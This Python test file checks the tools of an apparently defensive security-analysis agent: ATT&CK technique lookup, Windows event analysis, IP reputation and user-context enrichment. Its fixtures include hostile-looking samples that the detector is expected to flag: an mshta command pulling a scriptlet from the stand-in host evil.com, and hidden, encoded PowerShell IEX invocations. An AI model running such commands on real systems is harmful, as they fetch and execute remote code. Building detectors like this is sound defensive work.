"""Tests for agent tools."""

import json

from src.agents.tools import (
    analyse_event_fields,
    check_ip_reputation,
    enrich_user_context,
    lookup_technique,
)


class TestLookupTechnique:
    def test_known_technique(self):
        result = lookup_technique.invoke({"technique_id": "T1053.005"})
        assert "Scheduled Task" in result
        assert "Persistence" in result

    def test_parent_technique(self):
        result = lookup_technique.invoke({"technique_id": "T1053"})
        assert "Scheduled Task/Job" in result

    def test_unknown_technique(self):
        result = lookup_technique.invoke({"technique_id": "T9999"})
        assert "not found" in result

    def test_case_insensitive(self):
        result = lookup_technique.invoke({"technique_id": "t1003.001"})
        assert "LSASS" in result

    def test_credential_access(self):
        result = lookup_technique.invoke({"technique_id": "T1003.006"})
        assert "DCSync" in result
        assert "critical" in result

    def test_sub_technique_fallback(self):
        result = lookup_technique.invoke({"technique_id": "T1053.999"})
        assert "Parent technique" in result


class TestAnalyseEventFields:
    def test_suspicious_powershell(self):
        event = json.dumps({
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell -enc SGVsbG8=",
            "User": "SYSTEM",
            "EventID": 1,
        })
        result = analyse_event_fields.invoke({"event_json": event})
        assert "powershell" in result.lower()
        assert "obfuscation" in result.lower() or "encoding" in result.lower()
        assert "SYSTEM" in result

    def test_benign_svchost(self):
        event = json.dumps({
            "Image": "C:\\Windows\\System32\\svchost.exe",
            "EventID": 1,
            "User": "LOCAL SERVICE",
        })
        result = analyse_event_fields.invoke({"event_json": event})
        assert "system process" in result.lower() or "benign" in result.lower()

    def test_network_info(self):
        event = json.dumps({
            "SourceIp": "10.0.0.1",
            "DestinationIp": "10.0.0.2",
            "EventID": 3,
        })
        result = analyse_event_fields.invoke({"event_json": event})
        assert "10.0.0.1" in result
        assert "10.0.0.2" in result

    def test_empty_event(self):
        result = analyse_event_fields.invoke({"event_json": "{}"})
        assert "No significant fields" in result

    def test_invalid_json(self):
        result = analyse_event_fields.invoke({"event_json": "not json"})
        assert "Error" in result

    def test_mshta_suspicious(self):
        event = json.dumps({
            "Image": "C:\\Windows\\System32\\mshta.exe",
            "CommandLine": "mshta javascript:a=GetObject('script:http://evil.com/s.sct')",
            "EventID": 1,
        })
        result = analyse_event_fields.invoke({"event_json": event})
        assert "commonly abused" in result.lower()

    def test_hidden_execution(self):
        event = json.dumps({
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell -w hidden -nop -c IEX(something)",
            "EventID": 1,
        })
        result = analyse_event_fields.invoke({"event_json": event})
        assert "hidden" in result.lower()

    def test_eventid_context(self):
        event = json.dumps({"EventID": 4698})
        result = analyse_event_fields.invoke({"event_json": event})
        assert "Scheduled task created" in result

    def test_logon_eventid(self):
        event = json.dumps({"EventID": 4624, "TargetUserName": "admin"})
        result = analyse_event_fields.invoke({"event_json": event})
        assert "logon" in result.lower()


class TestCheckIpReputation:
    def test_private_ip(self):
        result = check_ip_reputation.invoke({"ip_address": "10.0.0.5"})
        assert "private" in result.lower()
        assert "internal" in result.lower()

    def test_loopback(self):
        result = check_ip_reputation.invoke({"ip_address": "127.0.0.1"})
        assert "loopback" in result.lower()

    def test_public_ip(self):
        result = check_ip_reputation.invoke({"ip_address": "8.8.8.8"})
        assert "external" in result.lower() or "public" in result.lower()

    def test_invalid_ip(self):
        result = check_ip_reputation.invoke({"ip_address": "not-an-ip"})
        assert "Invalid" in result

    def test_empty_ip(self):
        result = check_ip_reputation.invoke({"ip_address": ""})
        assert "No IP" in result

    def test_192_168_range(self):
        result = check_ip_reputation.invoke({"ip_address": "192.168.1.100"})
        assert "workstation" in result.lower() or "home" in result.lower()


class TestEnrichUserContext:
    def test_system_account(self):
        result = enrich_user_context.invoke({"username": "SYSTEM"})
        assert "highest privilege" in result.lower()

    def test_local_service(self):
        result = enrich_user_context.invoke({"username": "LOCAL SERVICE"})
        assert "low-privilege" in result.lower()

    def test_service_account(self):
        result = enrich_user_context.invoke({"username": "svc_sqlserver"})
        assert "service account" in result.lower()

    def test_machine_account(self):
        result = enrich_user_context.invoke({"username": "WORKSTATION01$"})
        assert "machine account" in result.lower()

    def test_admin_user(self):
        result = enrich_user_context.invoke({"username": "admin_john"})
        assert "privileged" in result.lower()

    def test_normal_user(self):
        result = enrich_user_context.invoke({"username": "john.doe"})
        assert "standard user" in result.lower()

    def test_empty_user(self):
        result = enrich_user_context.invoke({"username": ""})
        assert "No username" in result

    def test_anonymous_logon(self):
        result = enrich_user_context.invoke({"username": "ANONYMOUS LOGON"})
        assert "unauthorized" in result.lower()
